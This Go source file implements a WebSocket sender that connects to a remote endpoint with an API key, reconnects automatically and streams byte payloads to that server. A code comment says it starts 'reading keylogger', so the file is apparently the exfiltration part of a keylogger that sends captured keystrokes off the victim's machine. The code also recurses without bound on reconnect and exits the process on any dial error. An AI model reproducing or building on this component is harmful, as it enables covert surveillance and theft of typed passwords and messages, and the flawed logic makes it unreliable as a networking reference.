package internal

import (
	"fmt"
	"log"
	"log/slog"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

type Sender struct {
	origin_endpoint string
	url_ws          string
	ws              *websocket.Conn
	reader          chan bool
	writer          chan []byte
	done            chan struct{}
}

func MustGetNewSender(origin, apikey string) *Sender {
	if origin == "" {
		log.Fatal("Origin endpoint is empty string")
	}
	if apikey == "" {
		log.Fatal("ApiKey endpoint is empty string")
	}

	trimmedOrigin := strings.TrimPrefix(origin, "http")
	url_ws := fmt.Sprintf("ws%s?apikey=%s", trimmedOrigin, apikey)
	s := &Sender{
		origin_endpoint: origin,
		url_ws:          url_ws,
		ws:              nil,
		reader:          make(chan bool),
		writer:          make(chan []byte),
		done:            nil,
	}
	go s.handleReconnects()
	return s
}

func (s *Sender) connectWS() error {
	if s.url_ws == "" {
		return fmt.Errorf("url_ws is empty")
	}
	ws, _, err := websocket.DefaultDialer.Dial(s.url_ws, nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	s.ws = ws
	s.done = make(chan struct{})
	defer func() {
		s.ws.Close()
		s.ws = nil
	}()
	go s.read()
	s.write()
	slog.Info("Client end of connection")
	return nil
}

func (s *Sender) handleReconnects() {
	if s.ws == nil {
		// blocking call to start reading keylogger
		s.connectWS()
		time.Sleep(1 * time.Second)
	}
	s.handleReconnects()
}

func (s *Sender) write() {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		select {
		case _, ok := <-s.done:
			if !ok {
				slog.Info("Done signal received")
				return
			}
		case p, ok := <-s.writer:
			if !ok {
				return
			}
			if s.ws == nil {
				slog.Info(fmt.Sprintf("ws disconnected and payload %s lost\n", string(p)))
				continue
			}
			slog.Info(fmt.Sprintf("Sending payload %s, queue %d\n", string(p), len(s.writer)))
			err := s.ws.WriteMessage(websocket.BinaryMessage, p)
			if err != nil {
				slog.Error(
					fmt.Sprintf("Failed to send %s : details %s\n", string(p), err.Error()),
				)
				return
			}
		}
	}
}

func (s *Sender) read() {
	defer close(s.done)
	for {
		var msg []byte
		_, msg, err := s.ws.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(
				err,
				websocket.CloseGoingAway,
				websocket.CloseAbnormalClosure,
			) {
				slog.Error(fmt.Sprintf("Unexpected close error: %s\n", err.Error()))
			}
			slog.Error(fmt.Sprintf("sender:read: %s\n", err.Error()))
			return
		}
		slog.Info(fmt.Sprintf("received message: %s", msg))
	}
}

func (s *Sender) Send(p []byte) error {
	s.writer <- p
	return nil
}

func (s *Sender) Close() error {
	close(s.reader)
	close(s.writer)
	if s.ws != nil {
		s.ws.Close()
	}
	return nil
}
